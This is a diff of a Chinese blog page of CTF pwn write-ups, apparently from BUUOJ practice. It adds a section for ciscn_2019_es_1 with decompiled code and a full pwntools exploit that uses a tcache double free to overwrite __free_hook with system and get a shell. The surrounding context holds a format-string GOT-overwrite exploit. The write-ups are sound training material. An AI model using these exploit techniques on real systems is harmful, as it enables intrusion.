@@ -28,7 +28,7 @@
 <meta property="og:description" content="[TOC] 0x40.ciscn_2019_s_9看下检查,全没开 12345678yutao@ubuntu:~&#x2F;Desktop$ checksec .&#x2F;ciscn_s_9[*] &amp;#x27;&#x2F;home&#x2F;yutao&#x2F;Desktop&#x2F;ciscn_s_9&amp;#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-09-06T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-10-08T01:29:10.938Z">
+<meta property="article:modified_time" content="2021-10-17T06:18:17.207Z">
 <meta property="article:author" content="郁涛丶">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
@@ -338,7 +338,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">5.9k</span>阅读时长: <span class="post-count reading-time">35 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">6.5k</span>阅读时长: <span class="post-count reading-time">38 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -665,7 +665,34 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./wdb_2018_2nd_easyfmt&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &#x27;i386&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27041</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got)+ <span class="string">&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">print_addr =u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(print_addr)</span><br><span class="line">base = print_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>查了半天，，，，原来是libc写错了。。fuck。</p>
-<h1 id="0x4C"><a href="#0x4C" class="headerlink" title="0x4C."></a>0x4C.</h1>
+<h1 id="0x4C-ciscn-2019-es-1"><a href="#0x4C-ciscn-2019-es-1" class="headerlink" title="0x4C.ciscn_2019_es_1"></a>0x4C.ciscn_2019_es_1</h1><p>保护全开：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec ciscn_2019_es_1</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/ciscn_2019_es_1&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>add:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  __int64 *v2; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 size[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( heap_number &gt; <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enough!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = heap_number;</span><br><span class="line">  heap_addr[v1] = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the size of compary&#x27;s name&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, size);</span><br><span class="line">  *(heap_addr[heap_number] + <span class="number">2</span>) = size[<span class="number">0</span>];</span><br><span class="line">  v2 = heap_addr[heap_number];</span><br><span class="line">  *v2 = <span class="built_in">malloc</span>(LODWORD(size[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *heap_addr[heap_number], LODWORD(size[<span class="number">0</span>]));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input compary call:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, heap_addr[heap_number] + <span class="number">12</span>, <span class="number">0xC</span>uLL);</span><br><span class="line">  *(heap_addr[heap_number] + <span class="number">23</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  ++heap_number;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>call就是free：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">call</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input the index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( heap_addr[v1] )</span><br><span class="line">    <span class="built_in">free</span>(*heap_addr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You try it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是2.27，有tcache，先malloc个大一点的chunk，free后直接放入unsortedbin。然后就是正常流程了。</p>
+<p>tmd调了半天结果终于发现哪里有问题了，python的切片一直写错……</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27004</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name,compary</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&quot;compary&#x27;s name&quot;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;input name:&#x27;</span>,name)</span><br><span class="line">	io.sendafter(<span class="string">&#x27;call:&#x27;</span>,compary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">index</span>):</span></span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;choice&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;250&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="string">&#x27;2223451&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;2353&#x27;</span>)</span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">&#x27;13456&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;256&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4D-x-ctf-b0verfl0w"><a href="#0x4D-x-ctf-b0verfl0w" class="headerlink" title="0x4D.x_ctf_b0verfl0w"></a>0x4D.x_ctf_b0verfl0w</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec b0verfl0w </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/b0verfl0w&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>关了nx</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">还有个hint：</span><br><span class="line">.text:<span class="number">080484F</span>D hint            proc near</span><br><span class="line">.text:<span class="number">080484F</span>D ; __unwind &#123;</span><br><span class="line">.text:<span class="number">080484F</span>D                 push    ebp</span><br><span class="line">.text:<span class="number">080484F</span>E                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">08048500</span>                 sub     esp, <span class="number">24</span>h</span><br><span class="line">.text:<span class="number">08048503</span>                 retn</span><br><span class="line">.text:<span class="number">08048503</span> hint            endp ; sp-analysis failed</span><br><span class="line">.text:<span class="number">08048503</span></span><br><span class="line">.text:<span class="number">08048504</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048504</span>                 jmp     esp</span><br><span class="line">.text:<span class="number">08048506</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048506</span>                 retn</span><br><span class="line">.text:<span class="number">08048507</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048507</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0804850</span>C                 pop     ebp</span><br><span class="line">.text:<span class="number">0804850</span>D                 retn</span><br><span class="line">.text:<span class="number">0804850</span>D ; &#125; <span class="comment">// starts at 80484FD</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
     </article>
     <!-- license -->
     
@@ -814,7 +841,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x40-ciscn-2019-s-9"><span class="toc-number">1.</span> <span class="toc-text">0x40.ciscn_2019_s_9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x41-pwnable-hacknote"><span class="toc-number">2.</span> <span class="toc-text">0x41.pwnable_hacknote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x42-jarvisoj-level5"><span class="toc-number">3.</span> <span class="toc-text">0x42.jarvisoj_level5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x43-picoctf-2018-shellcode"><span class="toc-number">4.</span> <span class="toc-text">0x43.picoctf_2018_shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x44-hitcontraining-bamboobox"><span class="toc-number">5.</span> <span class="toc-text">0x44.hitcontraining_bamboobox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-House-Of-Force"><span class="toc-number">5.1.</span> <span class="toc-text">1.House Of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-unlink"><span class="toc-number">5.2.</span> <span class="toc-text">2.unlink</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x45-npuctf-2020-easyheap"><span class="toc-number">6.</span> <span class="toc-text">0x45.npuctf_2020_easyheap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x46-cmcc-pwnme2"><span class="toc-number">7.</span> <span class="toc-text">0x46.cmcc_pwnme2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x47-actf-2019-babystack"><span class="toc-number">8.</span> <span class="toc-text">0x47.actf_2019_babystack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x48-picoctf-2018-got-shell"><span class="toc-number">9.</span> <span class="toc-text">0x48.picoctf_2018_got_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x49-picoctf-2018-can-you-gets-me"><span class="toc-number">10.</span> <span class="toc-text">0x49.picoctf_2018_can_you_gets_me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4A-mrctf2020-easy-equation"><span class="toc-number">11.</span> <span class="toc-text">0x4A.mrctf2020_easy_equation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4B-wdb-2018-2nd-easyfmt"><span class="toc-number">12.</span> <span class="toc-text">0x4B.wdb_2018_2nd_easyfmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4C"><span class="toc-number">13.</span> <span class="toc-text">0x4C.</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x40-ciscn-2019-s-9"><span class="toc-number">1.</span> <span class="toc-text">0x40.ciscn_2019_s_9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x41-pwnable-hacknote"><span class="toc-number">2.</span> <span class="toc-text">0x41.pwnable_hacknote</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x42-jarvisoj-level5"><span class="toc-number">3.</span> <span class="toc-text">0x42.jarvisoj_level5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x43-picoctf-2018-shellcode"><span class="toc-number">4.</span> <span class="toc-text">0x43.picoctf_2018_shellcode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x44-hitcontraining-bamboobox"><span class="toc-number">5.</span> <span class="toc-text">0x44.hitcontraining_bamboobox</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-House-Of-Force"><span class="toc-number">5.1.</span> <span class="toc-text">1.House Of Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-unlink"><span class="toc-number">5.2.</span> <span class="toc-text">2.unlink</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x45-npuctf-2020-easyheap"><span class="toc-number">6.</span> <span class="toc-text">0x45.npuctf_2020_easyheap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x46-cmcc-pwnme2"><span class="toc-number">7.</span> <span class="toc-text">0x46.cmcc_pwnme2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x47-actf-2019-babystack"><span class="toc-number">8.</span> <span class="toc-text">0x47.actf_2019_babystack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x48-picoctf-2018-got-shell"><span class="toc-number">9.</span> <span class="toc-text">0x48.picoctf_2018_got_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x49-picoctf-2018-can-you-gets-me"><span class="toc-number">10.</span> <span class="toc-text">0x49.picoctf_2018_can_you_gets_me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4A-mrctf2020-easy-equation"><span class="toc-number">11.</span> <span class="toc-text">0x4A.mrctf2020_easy_equation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4B-wdb-2018-2nd-easyfmt"><span class="toc-number">12.</span> <span class="toc-text">0x4B.wdb_2018_2nd_easyfmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4C-ciscn-2019-es-1"><span class="toc-number">13.</span> <span class="toc-text">0x4C.ciscn_2019_es_1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x4D-x-ctf-b0verfl0w"><span class="toc-number">14.</span> <span class="toc-text">0x4D.x_ctf_b0verfl0w</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1086,224 +1113,6 @@
         
         
         
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
     
     
     
@@ -1320,6 +1129,21 @@
     
         
             
+            
+            <div class="archive-year"> Invalid date </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span>
+            <a class="archive-post-title" href="/2021/10/07/TOP/">【置顶】:防健忘，一些乱七八糟的东西</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
             
             <div class="archive-year"> 2021 </div>
             <ul class="year-list">
@@ -1547,21 +1371,6 @@
         <li class="archive-post-item">
             <span class="archive-post-date">10/11</span>
             <a class="archive-post-title" href="/2020/10/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">汇编笔记</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> Invalid date </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span>
-            <a class="archive-post-title" href="/2021/10/07/TOP/">【置顶】:防健忘，一些乱七八糟的东西</a>
         </li>
     
     </div>
